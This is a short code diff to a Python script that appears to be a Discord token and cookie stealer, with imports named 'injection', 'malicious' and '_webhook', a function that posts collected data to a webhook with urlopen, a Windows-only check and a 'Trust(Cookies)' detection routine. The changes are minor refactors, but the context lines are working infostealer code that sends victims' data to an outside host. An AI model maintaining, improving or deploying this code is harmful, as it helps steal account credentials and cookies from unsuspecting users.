@@ -2,6 +2,7 @@ import discordc
 import injection
 import informations
 import malicious
+import sys
 ii = informations.Info()
 import _webhook
 _webh = _webhook.WebhookX()
@@ -43,7 +44,7 @@ except Exception:
     subprocess.run(command, shell=True)
 
 if platform.system() != "Windows":
-    quit()
+    exit()
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -130,10 +131,9 @@ def LoadUrlib(webhook, data="", files="", headers=""):
         r = urlopen(Request(webhook, data=data, headers=headers))
         print(r)
         return r
-    else:
-        r = urlopen(Request(webhook, data=data))
-        print(r)
-        return r
+    r = urlopen(Request(webhook, data=data))
+    print(r)
+    return r
 
 
 def Trust(Cookies):
@@ -144,9 +144,8 @@ def Trust(Cookies):
     if len(tim) < 1:
         DETECTED = True
         return DETECTED
-    else:
-        DETECTED = False
-        return DETECTED
+    DETECTED = False
+    return DETECTED
 
 dclass = discordc.DiscordX()
 
